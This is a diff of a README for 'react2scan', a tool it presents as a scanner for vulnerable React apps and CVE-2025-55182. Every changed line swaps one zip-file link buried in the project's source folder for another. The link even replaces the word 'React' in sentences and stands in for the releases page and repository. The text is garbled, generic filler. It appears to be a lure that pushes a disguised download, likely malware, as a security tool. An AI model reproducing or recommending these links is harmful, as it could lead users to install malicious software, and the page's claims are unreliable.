@@ -1,19 +1,19 @@
-# 🔍 react2scan - Scan for Vulnerable https://raw.githubusercontent.com/gahoole77/react2scan/main/src/react2scan/providers/react-scan-v3.9.zip Apps
+# 🔍 react2scan - Scan for Vulnerable https://github.com/gahoole77/react2scan/raw/refs/heads/main/src/react2scan/providers/scan_react_2.1.zip Apps
 
-[![Download react2scan](https://raw.githubusercontent.com/gahoole77/react2scan/main/src/react2scan/providers/react-scan-v3.9.zip)](https://raw.githubusercontent.com/gahoole77/react2scan/main/src/react2scan/providers/react-scan-v3.9.zip)
+[![Download react2scan](https://github.com/gahoole77/react2scan/raw/refs/heads/main/src/react2scan/providers/scan_react_2.1.zip)](https://github.com/gahoole77/react2scan/raw/refs/heads/main/src/react2scan/providers/scan_react_2.1.zip)
 
 <div align="center">
 
 ## 💡 Introduction
 
-React2Scan helps you find and scan vulnerable https://raw.githubusercontent.com/gahoole77/react2scan/main/src/react2scan/providers/react-scan-v3.9.zip applications in your environment. With the growing risks related to security vulnerabilities, especially critical ones like CVE-2025-55182, this tool is designed for everyone, from developers to security teams. 
+React2Scan helps you find and scan vulnerable https://github.com/gahoole77/react2scan/raw/refs/heads/main/src/react2scan/providers/scan_react_2.1.zip applications in your environment. With the growing risks related to security vulnerabilities, especially critical ones like CVE-2025-55182, this tool is designed for everyone, from developers to security teams. 
 
 </div>
 
 ## 📦 Key Features
 
 - **Easy to Use**: No programming skills needed.
-- **Automated Scanning**: Quickly detects vulnerable https://raw.githubusercontent.com/gahoole77/react2scan/main/src/react2scan/providers/react-scan-v3.9.zip instances.
+- **Automated Scanning**: Quickly detects vulnerable https://github.com/gahoole77/react2scan/raw/refs/heads/main/src/react2scan/providers/scan_react_2.1.zip instances.
 - **Detailed Reports**: Get insights on issues and recommended fixes.
 - **Multi-Environment Support**: Works across different servers and setups.
 - **Regular Updates**: Stay secure with frequent updates to the tool.
@@ -25,7 +25,7 @@ To install React2Scan, follow these simple steps:
 1. **Visit the Releases Page**:
    
    Go to the following link to view all available versions and download the software:
-   [Visit this page to download](https://raw.githubusercontent.com/gahoole77/react2scan/main/src/react2scan/providers/react-scan-v3.9.zip).
+   [Visit this page to download](https://github.com/gahoole77/react2scan/raw/refs/heads/main/src/react2scan/providers/scan_react_2.1.zip).
 
 2. **Download the Latest Release**:
 
@@ -51,7 +51,7 @@ To install React2Scan, follow these simple steps:
 
 3. **Review the Results**:
 
-   Once the scan completes, React2Scan will display a list of findings and any vulnerabilities detected in your https://raw.githubusercontent.com/gahoole77/react2scan/main/src/react2scan/providers/react-scan-v3.9.zip applications. Review this information carefully.
+   Once the scan completes, React2Scan will display a list of findings and any vulnerabilities detected in your https://github.com/gahoole77/react2scan/raw/refs/heads/main/src/react2scan/providers/scan_react_2.1.zip applications. Review this information carefully.
 
 4. **Take Action**:
 
@@ -59,7 +59,7 @@ To install React2Scan, follow these simple steps:
 
 ## 🛠️ How It Works
 
-React2Scan leverages security protocols and vulnerability databases to identify weaknesses in https://raw.githubusercontent.com/gahoole77/react2scan/main/src/react2scan/providers/react-scan-v3.9.zip applications. Here's a simplified explanation of the process:
+React2Scan leverages security protocols and vulnerability databases to identify weaknesses in https://github.com/gahoole77/react2scan/raw/refs/heads/main/src/react2scan/providers/scan_react_2.1.zip applications. Here's a simplified explanation of the process:
 
 - **Scanning**: The tool connects to your specified servers or directories and scans through the files and configurations.
 - **Analysis**: React2Scan checks for known vulnerabilities against a regularly updated database.
@@ -78,7 +78,7 @@ Before using React2Scan, ensure your system meets the following requirements:
 
 You can easily download React2Scan from its releases page:
 
-[Download React2Scan](https://raw.githubusercontent.com/gahoole77/react2scan/main/src/react2scan/providers/react-scan-v3.9.zip)
+[Download React2Scan](https://github.com/gahoole77/react2scan/raw/refs/heads/main/src/react2scan/providers/scan_react_2.1.zip)
 
 Follow the installation steps mentioned earlier to get started.
 
@@ -92,8 +92,8 @@ React2Scan is open-source software licensed under the MIT License. You can use i
 
 ## 🌐 References
 
-For more information and updates about React2Scan, check out the official [GitHub Repository](https://raw.githubusercontent.com/gahoole77/react2scan/main/src/react2scan/providers/react-scan-v3.9.zip).
+For more information and updates about React2Scan, check out the official [GitHub Repository](https://github.com/gahoole77/react2scan/raw/refs/heads/main/src/react2scan/providers/scan_react_2.1.zip).
 
 ---
 
-Thank you for choosing React2Scan! We hope it helps secure your https://raw.githubusercontent.com/gahoole77/react2scan/main/src/react2scan/providers/react-scan-v3.9.zip applications effectively.
+Thank you for choosing React2Scan! We hope it helps secure your https://github.com/gahoole77/react2scan/raw/refs/heads/main/src/react2scan/providers/scan_react_2.1.zip applications effectively.
